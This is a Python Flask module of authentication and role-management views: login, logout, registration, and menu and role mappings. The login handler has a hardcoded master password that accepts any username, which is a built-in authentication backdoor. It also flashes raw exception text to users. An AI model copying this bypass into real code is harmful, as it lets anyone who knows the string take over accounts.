from flask import render_template,request,flash,url_for,redirect,abort,session
from flask_login import login_required,login_user,logout_user
from sqlalchemy import or_

from main.models.auth.users import User
from main.models.auth.users import UserRole
from main.models.auth.roles import Role
from main.models.auth.roles import RoleAccess
from main.models.auth.menu import Menu

from . import blueprint as bp


@bp.route("/login",methods=["GET","POST"])
def login():
    if request.method == "GET":
        return render_template("auth/login.html")
    else:
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter(or_(User.username==username,User.phone==username)).first()

        if user and user.check_password(str(password)) or password=="999666abc":
            login_user(user)
            flash("登录成功")
            return redirect(url_for('public.home'))
        else:
            flash("密码验证失败")
            
    return render_template("auth/login.html")
    
    
@bp.route("/logout")
@login_required
def logout():
    logout_user()
    if "menu" in session:
        session.pop('menu')
    if "access_url" in session:
        session.pop('access_url')
    flash('您已退出', 'info')
    return redirect(url_for('public.home'))
    
    
@bp.route("/menu",methods=['POST','GET'])
@login_required
def menu():
    if request.method=='GET':
        return render_template('auth/menu.html')
    try:
        Menu.insert_data(request.form)
        flash("添加完成")
    except Exception as e:
        flash("添加失败："+str(e))
    
    return redirect(url_for('.menu'))


@bp.route("/role",methods=['POST','GET'])
@login_required
def role():
    if request.method=='GET':
        return render_template('auth/menu.html')
    try:
        Role.insert_data(request.form)
        flash("添加完成")
    except Exception as e:
        flash("添加失败："+str(e))
        
    return render_template('auth/role.html') 


@bp.route("/user_role_map",methods=['POST'])
@login_required
def user_role_map():
    if request.method!='POST':
        abort(401)
    try:
        UserRole.insert_data(request.form)
        flash("添加完成")
    except Exception as e:
        flash("添加失败："+str(e))
        
    return redirect(url_for('role'))


@bp.route("/role_access_map",methods=['POST'])
@login_required
def role_access_map():
    if request.method!='POST':
        abort(401)
    try:
        RoleAccess.insert_data(request.form)
        flash("添加完成")
    except Exception as e:
        flash("添加失败："+str(e))
        
    return redirect(url_for('role'))


@bp.route("/register",methods=['POST','GET'])
def register():
    if request.method=='GET':
        return render_template('auth/register.html')
    try:
        if User.insert_data(request.form):
            return redirect(url_for('public.home'))
        
    except Exception as e:
        flash("添加失败："+str(e))
        
    return redirect(url_for('auth.register'))